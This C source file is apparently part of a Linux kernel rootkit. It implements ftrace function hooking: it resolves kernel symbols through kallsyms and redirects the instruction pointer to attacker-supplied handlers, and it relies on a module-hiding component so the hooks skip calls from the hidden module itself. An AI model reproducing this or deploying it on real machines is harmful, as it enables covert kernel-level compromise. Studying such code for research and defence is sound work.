#include "ftrace.h"
#include "module_hiding.h"

#include <linux/kallsyms.h>

/*
 * Get the original address of the function that should be hooked via kallsyms
 */
int ftrace_resolve_hook_addr(struct ftrace_hook *hook) {

    hook->address = kallsyms_lookup_name(hook->name);

    if (!hook->address) {
        return -ENOENT;
    }

    *((unsigned long*) hook->original) = hook->address;

    return 0;
}

/*
 * Modify instruction pointer
 */
void notrace ftrace_thunk(unsigned long ip, unsigned long parent_ip,
                          struct ftrace_ops *ops, struct pt_regs *regs)
{
    /* get ftrace_hook struct */
    struct ftrace_hook *hook = container_of(ops, struct ftrace_hook, ops);

    /* we cannot use THIS_MODULE, so we have to use our own within_module_core from module hiding */
    if (!__within_module_core(parent_ip)) {
        regs->ip = (unsigned long) hook->function;
    }
}

/*
 * Install a single hook
 */
int ftrace_install_hook(struct ftrace_hook *hook) {

    int err;

    /*
     * Get original address of function via kallsyms
     */
    err = ftrace_resolve_hook_addr(hook);
    if (err)
        return err;

    /*
     * We're going to modify %rip register so we'll need IPMODIFY flag
     * and SAVE_REGS as its prerequisite. ftrace's anti-recursion guard
     * is useless if we change %rip so disable it with RECURSION_SAFE.
     * We'll perform our own checks for trace function reentry.
     */
    hook->ops.func = ftrace_thunk;
    hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS
                      | FTRACE_OPS_FL_RECURSION_SAFE
                      | FTRACE_OPS_FL_IPMODIFY;

    err = ftrace_set_filter_ip(&hook->ops, hook->address, 0, 0);
    if (err) {
        return err;
    }

    err = register_ftrace_function(&hook->ops);
    if (err) {
        ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
        return err;
    }

    return 0;
}

/*
 * Remove a single hook
 */
void ftrace_remove_hook(struct ftrace_hook *hook) {

    unregister_ftrace_function(&hook->ops);
    ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);

}

/*
 * Install given hooks
 */
int ftrace_install_hooks(struct ftrace_hook *hooks, size_t count) {

    int err;
    size_t i;

    for (i = 0; i < count; i++) {
        err = ftrace_install_hook(&hooks[i]);
        if (err)
            goto error;
    }

    return 0;

error:
    while (i != 0) {
        ftrace_remove_hook(&hooks[--i]);
    }

    return err;

}

/*
 * Remove given hooks
 */
void ftrace_remove_hooks(struct ftrace_hook *hooks, size_t count) {

    size_t i;

    for (i = 0; i < count; i++)
        ftrace_remove_hook(&hooks[i]);

}